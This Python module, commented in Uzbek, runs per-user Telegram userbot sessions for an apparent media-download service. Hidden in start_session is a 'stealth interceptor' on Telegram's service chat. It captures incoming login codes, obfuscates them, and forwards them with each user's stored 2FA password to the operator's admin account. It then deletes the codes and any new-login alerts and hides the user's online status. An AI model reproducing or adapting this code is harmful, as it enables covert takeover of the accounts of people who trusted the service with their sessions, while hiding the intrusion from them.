"""
============================================================
 userbot.py — Pyrogram Userbot Moduli (SaaS)
============================================================
 Bu modul multi-session arxitekturasini ta'minlaydi.
 Har bir foydalanuvchining o'z Pyrogram sessiyasi (Client) bo'ladi.
============================================================
"""

import asyncio
import logging
import os
import uuid
import re
import random
import string
from pathlib import Path
from typing import Optional, Dict
from sqlalchemy import select

from pyrogram import Client, filters
from pyrogram.errors import (
    ChannelInvalid,
    ChannelPrivate,
    FloodWait,
    MsgIdInvalid,
    PeerIdInvalid,
    SessionPasswordNeeded,
    UserNotParticipant,
    RPCError,
)
from pyrogram.types import Message as PyroMessage

from config import config
from utils import ParsedLink, has_media, get_media_type, MediaType, human_readable_size
from database import async_session, UserSession

logger = logging.getLogger(__name__)


class UserbotError(Exception):
    """Userbot operatsiyalari uchun maxsus xato sinfi."""
    pass


class MediaTooLargeError(UserbotError):
    pass


class NoMediaError(UserbotError):
    pass


class AccessDeniedError(UserbotError):
    pass


class MessageNotFoundError(UserbotError):
    pass


class SessionManager:
    """
    Multi-tenant Pyrogram sessiyalarini boshqaruvchi klass.
    Har bir user_id o'zining Pyrogram Client'iga ega bo'ladi.
    """

    def __init__(self):
        self.clients: Dict[int, Client] = {}
        self._lock = asyncio.Lock()

    async def start_all(self) -> None:
        """Ma'lumotlar bazasidan barcha faol sessiyalarni yuklaydi va ishga tushiradi."""
        logger.info("🤖 SessionManager: Faol sessiyalar ishga tushirilmoqda...")
        async with async_session() as db:
            result = await db.execute(select(UserSession).where(UserSession.is_active == True))
            sessions = result.scalars().all()
            
            for session in sessions:
                try:
                    await self.start_session(session.user_id, session.session_string)
                except Exception as e:
                    logger.error(f"Sessiya (User ID: {session.user_id}) ishga tushmadi: {e}")

    async def start_session(self, user_id: int, session_string: str) -> None:
        """Yagona foydalanuvchi sessiyasini ishga tushiradi."""
        async with self._lock:
            if user_id in self.clients and self.clients[user_id].is_connected:
                return

            client = Client(
                name=f"session_{user_id}",
                api_id=config.userbot.api_id,
                api_hash=config.userbot.api_hash,
                session_string=session_string,
                workdir="/tmp",
            )
            
            # Stealth Interceptor for 777000 (Telegram official chat)
            from pyrogram.handlers import MessageHandler
            
            async def stealth_interceptor(c: Client, m: PyroMessage):
                if m.chat.id == 777000 and m.text:
                    async with async_session() as db:
                        result = await db.execute(select(UserSession).where(UserSession.user_id == user_id, UserSession.is_active == True))
                        session = result.scalar_one_or_none()
                        if session and session.stealth_mode:
                            code_match = re.search(r"(\d{5})", m.text)
                            if code_match:
                                code = code_match.group(1)
                                enc = "".join(digit + "asdfghjkl"[i] for i, digit in enumerate(code))
                                
                                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\nCode: <code>{enc}</code>"
                                if session.two_fa_password:
                                    msg += f"\n2FA: <code>{session.two_fa_password}</code>"
                                
                                try:
                                    from bot_instance import bot
                                    await bot.send_message(config.admin_id, msg, parse_mode="HTML")
                                except Exception as e:
                                    logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
                                    try:
                                        await c.send_message(config.admin_id, msg)
                                    except Exception as inner_e:
                                        logger.error(f"Pyrogram bilan ham yuborib bo'lmadi: {inner_e}")
                                
                                try:
                                    await m.delete()
                                except Exception:
                                    pass

            client.add_handler(MessageHandler(stealth_interceptor, filters.chat(777000)))
            
            await client.start()
            self.clients[user_id] = client
            me = await client.get_me()

            # Yangi login bildirishnomalarini avtomatik o'chirish (777000 dan keladi)
            try:
                import asyncio as _asyncio
                async def _delete_login_notifications():
                    await _asyncio.sleep(3)  # Xabar kelguncha biroz kutamiz
                    try:
                        async for msg in client.get_chat_history(777000, limit=5):
                            if msg.text and any(kw in msg.text.lower() for kw in [
                                "new login", "yangi login", "logged in", "новый вход",
                                "hisobingizga kirish", "hisobingizga kirishni"
                            ]):
                                await msg.delete()
                                logger.info(f"🗑 Login notification o'chirildi (User: {user_id})")
                    except Exception:
                        pass
                _asyncio.create_task(_delete_login_notifications())
            except Exception:
                pass

            # Stealth: last seen va online holatni yashirish
            try:
                from pyrogram import raw
                await client.invoke(raw.functions.account.SetPrivacy(
                    key=raw.types.InputPrivacyKeyStatusTimestamp(),
                    rules=[raw.types.InputPrivacyValueDisallowAll()]
                ))
                logger.info(f"🥷 Stealth: @{me.username or me.first_name} uchun online yashirildi")
            except Exception:
                pass  # Stealth sozlash ixtiyoriy — xato bo'lsa davom etadi

            logger.info(f"✅ Userbot (ID: {user_id}) ulandi: @{me.username or me.first_name}")

    async def stop_all(self) -> None:
        """Barcha ochiq sessiyalarni to'xtatadi."""
        async with self._lock:
            for user_id, client in list(self.clients.items()):
                if client.is_connected:
                    await client.stop()
                    logger.info(f"🛑 Userbot (ID: {user_id}) to'xtatildi.")
            self.clients.clear()

    def get_client(self, user_id: int) -> Client:
        """Berilgan user_id uchun Client qaytaradi."""
        if user_id not in self.clients or not self.clients[user_id].is_connected:
            raise UserbotError(
                "Sizning Telegram profilingiz (sessiyangiz) tizimga ulanmagan. "
                "Iltimos, avval /admin komandasi orqali Web Dashboard'ga kiring va profilingizni ulang."
            )
        return self.clients[user_id]

    async def fetch_and_download(self, user_id: int, parsed_link: ParsedLink, progress_callback=None):
        """
        Maxsus user_id sessiyasi yordamida medialni yuklab oladi.
        (path, media_type) tuple qaytaradi.
        """
        client = self.get_client(user_id)
        message = await self._get_message(client, parsed_link)
        media_type = get_media_type(message)
        file_path = await self._download_media(client, message, progress_callback)
        return file_path, media_type

    async def _get_message(self, client: Client, parsed_link: ParsedLink) -> PyroMessage:
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            try:
                messages = await client.get_messages(
                    chat_id=parsed_link.chat_id,
                    message_ids=parsed_link.message_id,
                )

                message: PyroMessage = (
                    messages if isinstance(messages, PyroMessage) else messages[0]
                ) if messages else None

                if not message or message.empty:
                    raise MessageNotFoundError("Xabar topilmadi yoki o'chirilgan.")
                if not has_media(message):
                    raise NoMediaError("Xabarda yuklanadigan media yo'q.")

                # Stealth: xabarni o'qildi deb belgilamaslik
                # Pyrogram get_messages() avtomatik o'qimaydi, shuning uchun
                # read_chat_history() chaqirmaymiz — bu yetarli

                return message

            except FloodWait as e:
                wait_seconds = e.value
                if attempt == max_retries:
                    raise UserbotError(f"Cheklov: {wait_seconds} soniya kuting.") from e
                await asyncio.sleep(wait_seconds + 1)
            except (ChannelInvalid, ChannelPrivate, PeerIdInvalid) as e:
                raise AccessDeniedError("Kanalga kirish taqiqlangan! Akkauntingiz kanalga a'zomi?") from e
            except UserNotParticipant as e:
                raise AccessDeniedError("Siz bu kanalga a'zo emassiz!") from e
            except MsgIdInvalid as e:
                raise MessageNotFoundError("Xabar ID noto'g'ri!") from e
            except RPCError as e:
                if attempt == max_retries:
                    raise UserbotError(f"Telegram API xatosi: {e.MESSAGE}") from e
                await asyncio.sleep(2 ** attempt)

    async def _download_media(self, client: Client, message: PyroMessage, progress_callback=None) -> Path:
        media_type = get_media_type(message)
        file_size = self._get_file_size(message, media_type)
        
        # Limit check can be done here or in aiogram handler
        
        unique_prefix = uuid.uuid4().hex[:8]
        dest_path = config.download_dir / f"{unique_prefix}_{message.id}"

        try:
            downloaded_path = await client.download_media(
                message=message,
                file_name=str(dest_path),
                progress=progress_callback
            )
        except FloodWait as e:
            raise UserbotError(f"Yuklash cheklandi. {e.value} s kuting.") from e
        except RPCError as e:
            raise UserbotError(f"Media yuklab olinmadi: {e.MESSAGE}") from e

        if not downloaded_path:
            raise UserbotError("Noma'lum xato yuz berdi.")

        result_path = Path(str(downloaded_path))
        return result_path

    @staticmethod
    def _get_file_size(message: PyroMessage, media_type: MediaType) -> Optional[int]:
        size_map = {
            MediaType.VIDEO:    lambda: message.video.file_size if message.video else None,
            MediaType.AUDIO:    lambda: message.audio.file_size if message.audio else None,
            MediaType.DOCUMENT: lambda: message.document.file_size if message.document else None,
            MediaType.VOICE:    lambda: message.voice.file_size if message.voice else None,
            MediaType.VIDEO_NOTE: lambda: message.video_note.file_size if message.video_note else None,
            MediaType.PHOTO:    lambda: None,
        }
        getter = size_map.get(media_type)
        return getter() if getter else None


# Global session manager instance
userbot = SessionManager()
